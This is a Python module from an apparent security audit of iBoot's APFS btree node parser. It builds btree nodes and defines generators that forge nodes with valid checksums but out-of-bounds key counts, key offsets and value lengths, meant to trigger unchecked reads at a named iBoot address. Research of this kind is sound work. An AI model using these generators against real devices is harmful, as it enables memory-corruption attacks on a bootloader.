"""btree_node_phys_t builder and the R14.3 malformation generators.

This is the attack surface R14 is auditing: iBoot's btree node walker at
0x14ae8..0x1526c (FINDINGS.md:6449) reads, straight off disk, the counts and
offsets that bound a node's table-of-contents (TOC), key area and value area. If
any one of them is not checked against the node size, indexing runs outside the
4096-byte node. The classic shape (FINDINGS.md:6462-6467): a TOC entry is a pair
of u16 (offset,length); keys grow from one end of the node and values from the
other, so a value offset is subtracted from the node end, and an unchecked value
length is a straight underflow.

Node layout (OBJECT offsets; verified against real Apple btree nodes this
session AND the repo's code map):

    0x00  obj_phys_t                 (o_type low-16 == 2, OBJECT_TYPE_BTREE)
    0x20  btn_flags        u16       (observed 0x07=ROOT|LEAF|FIXED, 0x03=ROOT|LEAF)
    0x22  btn_level        u16
    0x24  btn_nkeys        u32       (FINDINGS.md:6270; real data)
    0x28  btn_table_space  nloc_t    {off u16, len u16}  (FINDINGS.md:6271; real data)
    0x2C  btn_free_space   nloc_t    {off u16, len u16}  (real data)
    0x30  btn_key_free_list nloc_t   (per Apple reference; not individually checked)
    0x34  btn_val_free_list nloc_t   (per Apple reference; not individually checked)
    0x38  btn_data[]                 TOC, then keys ->, <- values  (FINDINGS.md:6461; real data)

CONVENTION CAVEAT: the exact origin of the TOC key/value offsets (relative to
the key-area start / the value-area end) follows the Apple APFS reference. iBoot
0x14ae8's precise TOC walk has NOT been audited yet (that is R14.3's open task),
so the WELL-FORMED layout below is spec-based, not confirmed byte-accepted by
this iBoot. The MALFORMATION generators do not depend on that convention being
exact: each one makes an offset/length exceed the node bounds BY CONSTRUCTION,
so it is out of bounds under any reasonable convention. That is the robust,
grounded part — the inputs an unchecked walker would mis-handle.
"""
from __future__ import annotations

import struct
from dataclasses import dataclass, field

from .fletcher import apply_checksum
from .objects import OBJECT_TYPE_BTREE, OBJ_PHYSICAL, build_object

DATA_OFF = 0x38           # btn_data[] start (FINDINGS.md:6461; real data)
BTREE_INFO_SIZE = 0x28    # btree_info_t trailer in a ROOT node (Apple reference)
KVLOC_SIZE = 8            # variable TOC entry: {key nloc, val nloc} = 4 u16

# btn_flags bits (ROOT/LEAF/FIXED confirmed from observed 0x03 and 0x07).
BTNODE_ROOT = 0x0001
BTNODE_LEAF = 0x0002
BTNODE_FIXED_KV_SIZE = 0x0004

# Default o_type for a physical btree node (observed 0x40000002).
PHYSICAL_BTREE_OTYPE = OBJ_PHYSICAL | OBJECT_TYPE_BTREE  # 0x40000002


@dataclass
class Nloc:
    """A 4-byte APFS nloc_t {uint16 off; uint16 len}."""

    off: int
    length: int

    def pack(self) -> bytes:
        return struct.pack("<HH", self.off & 0xFFFF, self.length & 0xFFFF)


@dataclass
class Kvloc:
    """An 8-byte variable TOC entry {nloc_t key; nloc_t val}."""

    key: Nloc
    val: Nloc

    def pack(self) -> bytes:
        return self.key.pack() + self.val.pack()


@dataclass
class BTreeNode:
    """A one-block variable-kv btree node (the R14.3 target shape).

    `entries` is a list of (key_bytes, value_bytes). build() lays the keys out
    forward from the key area and the values backward from the value-area end,
    writes the TOC, and forges a valid Fletcher-64. The *_override fields inject
    the lies the malformation generators use.
    """

    o_oid: int = 1
    o_xid: int = 1
    o_type: int = PHYSICAL_BTREE_OTYPE
    flags: int = BTNODE_ROOT | BTNODE_LEAF
    level: int = 0
    block_size: int = 0x1000
    entries: list = field(default_factory=list)

    # malformation overrides (None = derive honestly from `entries`):
    nkeys_override: "int | None" = None
    table_space_len_override: "int | None" = None

    # ---- geometry helpers ---------------------------------------------------
    def _value_area_end(self) -> int:
        end = self.block_size
        if self.flags & BTNODE_ROOT:
            end -= BTREE_INFO_SIZE
        return end

    def _toc_len(self) -> int:
        if self.table_space_len_override is not None:
            return self.table_space_len_override
        return len(self.entries) * KVLOC_SIZE

    # ---- builders -----------------------------------------------------------
    def build(self) -> bytes:
        """Forge the node bytes with a valid checksum (honest layout)."""
        ts_off = 0
        ts_len = self._toc_len()
        nkeys = self.nkeys_override if self.nkeys_override is not None else len(self.entries)

        block = bytearray(self.block_size)

        key_base = DATA_OFF + ts_off + ts_len     # keys grow forward from here
        value_end = self._value_area_end()        # values grow backward from here

        toc = bytearray()
        key_cursor = 0        # offset within the key area
        value_cursor = 0      # bytes consumed from the value-area end
        for key_bytes, value_bytes in self.entries:
            k = Nloc(off=key_cursor, length=len(key_bytes))
            block[key_base + key_cursor : key_base + key_cursor + len(key_bytes)] = key_bytes
            key_cursor += len(key_bytes)

            value_cursor += len(value_bytes)
            v = Nloc(off=value_cursor, length=len(value_bytes))
            vstart = value_end - value_cursor
            block[vstart : vstart + len(value_bytes)] = value_bytes

            toc += Kvloc(key=k, val=v).pack()

        # Header fields.
        struct.pack_into("<H", block, 0x20, self.flags & 0xFFFF)
        struct.pack_into("<H", block, 0x22, self.level & 0xFFFF)
        struct.pack_into("<I", block, 0x24, nkeys & 0xFFFFFFFF)
        struct.pack_into("<HH", block, 0x28, ts_off, ts_len & 0xFFFF)       # btn_table_space
        # btn_free_space: the gap between the end of the keys and the start of
        # the values (honest bookkeeping; not required by the attack).
        free_off = key_cursor
        free_len = max(0, (value_end - value_cursor) - key_base)
        struct.pack_into("<HH", block, 0x2C, free_off & 0xFFFF, free_len & 0xFFFF)

        # TOC into the data area.
        block[DATA_OFF + ts_off : DATA_OFF + ts_off + len(toc)] = toc

        # o_type / oid / xid via build_object (which also forges the checksum).
        # build_object writes its own header, so hand it the body after 0x20.
        return build_object(
            o_oid=self.o_oid,
            o_xid=self.o_xid,
            o_type=self.o_type,
            body=bytes(block[0x20:]),
            block_size=self.block_size,
        )


# --------------------------------------------------------------------------- #
# Malformation generators (R14.3). Each returns a one-block node with a VALID
# Fletcher-64 but a structure that is out of bounds by construction — the inputs
# an unchecked walker at 0x14ae8 would mis-handle. The checksum is always valid
# (that is the whole point of R13.2: integrity does not stop us).
# --------------------------------------------------------------------------- #
def _patch_toc_entry(block: bytes, index: int, entry: Kvloc) -> bytes:
    """Overwrite TOC[index] (8-byte kvloc) and re-forge the checksum."""
    ts_off, ts_len = struct.unpack_from("<HH", block, 0x28)
    pos = DATA_OFF + ts_off + index * KVLOC_SIZE
    if pos + KVLOC_SIZE > DATA_OFF + ts_off + ts_len:
        raise ValueError(f"entry {index} lies outside btn_table_space")
    out = bytearray(block)
    out[pos : pos + KVLOC_SIZE] = entry.pack()
    return apply_checksum(bytes(out))


def forge_nkeys_exceeds_toc(node: BTreeNode, extra: int = 8) -> bytes:
    """btn_nkeys set larger than the TOC area can hold.

    A walker that trusts btn_nkeys and strides KVLOC_SIZE per entry without
    checking nkeys*8 <= btn_table_space.len will read entries past the TOC, into
    the key area and beyond. `extra` is how many entries past capacity to claim.
    """
    capacity = node._toc_len() // KVLOC_SIZE
    forged = BTreeNode(**{**node.__dict__})
    forged.nkeys_override = capacity + extra
    return forged.build()


def forge_value_length_underflow(node: BTreeNode, index: int = 0, bad_len: int = 0xFFFF) -> bytes:
    """A TOC value whose length underflows the value area.

    The value is located at value_area_end - val.off; a huge val.len (or an
    oversized val.off) makes [start, start+len) run off the end of the node — or,
    with off > value-area size, start underflows below the data area. This is the
    'value offset subtracted from the node end' underflow (FINDINGS.md:6467).
    """
    block = node.build()
    # Point the value well past the node end: off beyond the value-area size and
    # a length that cannot fit.
    bad = Kvloc(key=Nloc(off=0, length=0), val=Nloc(off=0xFFFF, length=bad_len))
    return _patch_toc_entry(block, index, bad)


def forge_key_offset_past_node(node: BTreeNode, index: int = 0, bad_off: int = 0xFFFF) -> bytes:
    """A TOC key whose offset+length addresses past the end of the node.

    key is at key_area_base + key.off; a key.off near 0xFFFF puts it far beyond
    the 4096-byte node. A walker that does not check key.off+key.len against the
    node size reads out of bounds.
    """
    block = node.build()
    bad = Kvloc(key=Nloc(off=bad_off, length=0xFFFF), val=Nloc(off=0, length=0))
    return _patch_toc_entry(block, index, bad)


def build_btree_node(**kwargs) -> bytes:
    """Convenience: construct a BTreeNode and build() it."""
    return BTreeNode(**kwargs).build()
